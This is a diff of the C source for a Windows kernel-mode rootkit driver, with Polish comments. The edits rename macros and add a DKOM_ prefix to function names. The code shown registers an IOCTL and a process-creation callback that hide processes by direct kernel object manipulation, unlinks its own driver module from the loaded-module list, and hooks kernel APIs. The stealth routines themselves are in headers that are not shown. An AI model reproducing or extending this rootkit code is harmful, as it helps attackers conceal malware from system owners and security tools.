@@ -1,14 +1,14 @@
-#include <ntddk.h>
 
+#include <ntddk.h>
 #include "rootkit.h"
 #include "rk_Tools.h"
 #include "rk_DKOM.h"
 #include "rk_Hook.h"
 
-#define		FILE_DEVICE_SHADOW_DRIVER	FILE_DEVICE_UNKNOWN
+#define		FILE_DEVICE_ROOTKIT_DRIVER	FILE_DEVICE_UNKNOWN
 
 // ten kod IOCTL wykorzystujemy do komunikacji z aplikacja
-#define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_SHADOW_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // lista zaladowanych modu³ów
 PMODULE_ENTRY	g_ModuleListBegin;
@@ -16,7 +16,7 @@ PMODULE_ENTRY	g_ModuleListBegin;
 // obiekt urzadzenia sterownika rootkita
 PDEVICE_OBJECT	gp_DeviceObject = NULL;
 
-// offsety wybrane 
+// offsety oraz indeksy wybrane dla aktualnego systemu
 NTOSKRNL_OFFSETS    offsets;
 API_INDEXES         currentAPI;
 
@@ -68,7 +68,7 @@ VOID ProcessNotify(
     		  if (strlen(processName) >= len) {
                   if (RtlCompareMemory( processName, rulingProcess, len ) == len) {
                     DbgPrint("rootkit: Chowam proces: %ld\n",hProcessId);
-                    OnProcessHide( (ULONG)hProcessId );                     
+                    DKOM_OnProcessHide( (ULONG)hProcessId );                     
                   }
               }
           }
@@ -104,7 +104,7 @@ NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 NTSTATUS OnDriverClose( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
 	NTSTATUS status = STATUS_SUCCESS;
-	DbgPrint("rootkit: OnDriverClose");
+	DbgPrint("rootkit: OnDriverClose\n");
 
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
@@ -170,7 +170,7 @@ NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 	{
 	case IOCTL_HIDE_PROCESS:
 		if (inputSize == sizeof(ULONG)) {
-			OnProcessHide( *(ULONG*)pInputBuffer );
+			DKOM_OnProcessHide( *(ULONG*)pInputBuffer );
 		}
 		break;
 
@@ -280,9 +280,9 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	g_ModuleListBegin =  (PMODULE_ENTRY)GetModuleListBegin(driverObject);
+	g_ModuleListBegin =  (PMODULE_ENTRY)DKOM_GetModuleListBegin(driverObject);
 
-	HideRootkitModule();
+	DKOM_HideRootkitModule();
 
 	HookApis();
 	
